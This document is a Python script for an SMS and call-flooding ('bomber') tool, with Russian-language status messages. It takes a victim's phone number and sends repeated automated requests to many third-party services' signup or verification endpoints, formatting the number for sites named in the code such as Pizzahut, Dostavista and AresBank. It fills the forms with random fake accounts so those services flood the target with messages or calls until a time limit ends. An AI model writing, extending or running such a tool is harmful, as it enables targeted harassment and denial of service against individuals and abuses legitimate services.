import argparse
import time
import requests
import random
import re
from Sites import SMS_FLOODS, CALL_FLOODS

class Attack:
    r = 0
    START_TIME = None
    SITES = SMS_FLOODS.copy()
    SITES_CALL = CALL_FLOODS.copy()
    
    
    @staticmethod
    def config_phone(_phone):
        _phone9 = _phone[1:]
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _name = ''
        _email = 'test123@gmail.com'
        for _ in range(12):
            _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))


        return {
        '_email': _email,
        '_name': _name,
        'password': password,
        'username': username,
        '_password': password,
        '_username': username,
        '_phone': _phone,
        '_phone9': _phone9,
        '_phoneAresBank': _phoneAresBank,
        '_phone9dostavista': _phone9dostavista,
        '_phoneOstin': _phoneOstin,
        '_phonePizzahut': _phonePizzahut,
        '_phoneGorzdrav': _phoneGorzdrav,}
    
    @property
    def check_in_time(self):
        if self.time_range is None:
            return True
        if time.time() - self.START_TIME < self.time_range:
            return True
        return False 


    def __init__(self, _phone, _type = 'SMS', time_range=None, timeout=2):
        """
        docstring
        """
        self.phone = _phone
        self.timeout = timeout
        self.time_range = time_range
        self._type = _type

        if self.START_TIME is None:
            self.START_TIME = time.time()


    def config_attack(self):
        if self._type == 'SMS':
            query = self.SITES
        else:
            query = self.SITES_CALL

        if len(query.keys()):
            key = list(query.keys())[0]
            value = query.pop(key)
            returned = {k: v for k, v in value.items()}
            returned['site'] = key
            if 'attributes' in returned.keys():
                for attr_key, attr_val in returned['attributes'].items():
                    if isinstance(attr_val, dict):
                        for k, val in attr_val.items():
                            try:
                                if isinstance(val, str):
                                    returned['attributes'][attr_key][k] = val.format(**self.config_phone(self.phone))
                            except Exception as exc:
                                print(type(exc), exc, '\nIt happens in input: {}'.format(value))
                                input()

            return returned
        else:
            return None
    
    def get_request(self, site, method, attributes=None, **kwargs):
        if attributes:
            try:
                r = getattr(requests, method)(site, **attributes, timeout=self.timeout)
            except requests.exceptions.ReadTimeout:
                return 408
            except requests.exceptions.ConnectionError:
                return 400
        else:
            try:
                r = getattr(requests, method)(site, timeout=self.timeout)
            except requests.exceptions.ReadTimeout:
                return 408
            except requests.exceptions.ConnectionError:
                return 400
        return r.status_code
            
    def circle(self):
        while True:
            if self.check_in_time:
                r = self.run()
                if r is None:
                    if self._type == 'SMS':
                        self.SITES = SMS_FLOODS.copy()
                    else:
                        self.SITES_CALL = CALL_FLOODS.copy()
            else:
                break


    def run(self):
        query = self.config_attack()
        if query:
            code = self.get_request(**query)
            if int(code) < 300:
                self.r += 1
                try:
                    print(code, query['success_text'], self.r)

                except KeyError:
                    print(code, '[+] Отправлено | Кол-во - ', self.r)
                if self._type == 'SMS':
                    time.sleep(1)
                else:
                    time.sleep(1)


            else:
                try:
                    print(code, query['failure_text'])
                except KeyError:
                    print(code, '[-] Не отправлено')
            return code
        else:
            return None

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('phone', action='store')
    parser.add_argument('-t', '--type', action='store', dest='type', default='SMS')
    parser.add_argument('-r', '--range', action='store', dest='range', default=None, type=int)
    args = parser.parse_args()
    attack = Attack(args.phone, _type=args.type, time_range=args.range)
    attack.circle()